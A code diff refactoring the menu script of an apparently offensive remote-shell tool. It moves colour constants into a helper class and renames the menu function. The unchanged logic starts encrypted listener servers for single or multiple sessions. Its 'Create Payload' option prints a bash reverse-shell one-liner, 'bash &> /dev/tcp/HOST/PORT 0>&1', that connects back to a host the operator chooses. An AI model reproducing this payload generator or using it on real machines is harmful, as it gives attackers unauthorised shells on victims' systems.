@@ -18,47 +18,34 @@ from src.server.server import ESServer
 from src.helper.helper import Helper
 
 #MARK: Globals
-iswin = sys.platform.startswith('win')
-GREEN = '' if iswin else '\033[1;92m'
-RED = '' if iswin else '\033[1;91m'
-WHITE = '' if iswin else '\033[0;97m'
-ENDC = '' if iswin else '\033[0m'
-UNDERLINE_GREEN = '' if iswin else '\033[4;92m'
-WHITEBU = '' if iswin else '\033[1;4m'
-COLOR_INFO = '' if iswin else '\033[0;36m'
-NES = ('' if iswin else '\033[4;32m')+"NES"+WHITE+"> "
-
-#MARK: Globals
 h = Helper()
 shellKey = ''.join((random.choice(string.letters+string.digits)) for x in range(32))
 terminator = ''.join((random.choice(string.letters)) for x in range(16))
 liveterminator = ''.join((random.choice(string.letters)) for x in range(16))
 server = ESServer(ESEncryptor(shellKey,16),terminator,liveterminator,h)
 
-BANNER_ART_TEXT = GREEN+"""
+BANNER_ART_TEXT = h.GREEN+"""
 .---.          .-. .        . .       \\      `.
 |             (   )|        | |     o  \\       `.
 |--- .-.. .-.. `-. |--. .-. | |         \\        `.
 |   (   |(   |(   )|  |(.-' | |     o    \\      .`
 '---'`-`| `-`| `-' '  `-`--'`-`-          \\   .`
-     ._.' ._.'                               `          """+RED+"""
- _._._._._._._._._._|"""+COLOR_INFO+"______________________________________________."+RED+"""
-|_#_#_#_#_#_#_#_#_#_|"""+COLOR_INFO+"_____________________________________________/"+RED+"""
+     ._.' ._.'                               `          """+h.RED+"""
+ _._._._._._._._._._|"""+h.COLOR_INFO+"______________________________________________."+h.RED+"""
+|_#_#_#_#_#_#_#_#_#_|"""+h.COLOR_INFO+"_____________________________________________/"+h.RED+"""
                     l
-"""+WHITE+"\nVersion: 2.0.9.6\nCreated By Lucas Jackson (@neoneggplant)\n"+ENDC
-BANNER_MENU_TEXT = WHITE + "-"*40 + "\n" + """ Menu:
+"""+h.WHITE+"\nVersion: 2.0.9.6\nCreated By Lucas Jackson (@neoneggplant)\n"+h.ENDC
+BANNER_MENU_TEXT = h.WHITE+"-"*40+"\n"+""" Menu:
     1): Start Server
     2): Start Multi Session
     3): Create Payload
     4): Exit
-""" + WHITE + "-"*40
-BANNER = BANNER_ART_TEXT + "" + BANNER_MENU_TEXT + "\n" + NES
+"""+h.WHITE+"-"*40
+BANNER = BANNER_ART_TEXT+""+BANNER_MENU_TEXT+"\n"+h.NES
 
-CMD_CLEAR = 'cls' if iswin else 'clear'
-
-def interactiveMenu():
+def menu():
     while 1:
-        os.system(CMD_CLEAR)
+        os.system(h.CMD_CLEAR)
         option = raw_input(BANNER)
         choose = {
             "1" : menuStartServer,
@@ -68,7 +55,7 @@ def interactiveMenu():
         }
         try:
             choose[option]()
-            os.system(CMD_CLEAR)
+            os.system(h.CMD_CLEAR)
         except KeyError:
             continue
 
@@ -86,10 +73,10 @@ def promptHostPort():
     return [lhost,lport]
 
 def promptServerRun(host,port):
-    if raw_input(NES+"Start Server? (Y/n): ") == "n":
+    if raw_input(h.NES+"Start Server? (Y/n): ") == "n":
         return
     else:
-        if raw_input(NES+"Multi Server? (y/N): ") == "y":
+        if raw_input(h.NES+"Multi Server? (y/N): ") == "y":
             server.multiServer(host,port)
         else:
             server.singleServer(host,port)
@@ -103,11 +90,11 @@ def menuStartServer(): #1
 def menuStartMultiServer(): #2
     sp = promptHostPort()
     server.multiServer(sp[0],sp[1]);
-    interactiveMenu()
+    menu()
 
 def menuCreateScript(): #3
     sp = promptHostPort()
-    print COLOR_INFO+"bash &> /dev/tcp/"+sp[0]+"/"+str(sp[1])+" 0>&1"+ENDC
+    print h.COLOR_INFO+"bash &> /dev/tcp/"+sp[0]+"/"+str(sp[1])+" 0>&1"+h.ENDC
     promptServerRun(sp[0],sp[1])
 
 def menuExit(): #4
@@ -116,7 +103,7 @@ def menuExit(): #4
 def main():
     #main menu options
     try:
-        interactiveMenu()
+        menu()
     except (KeyboardInterrupt, EOFError) as e:
         pass
 
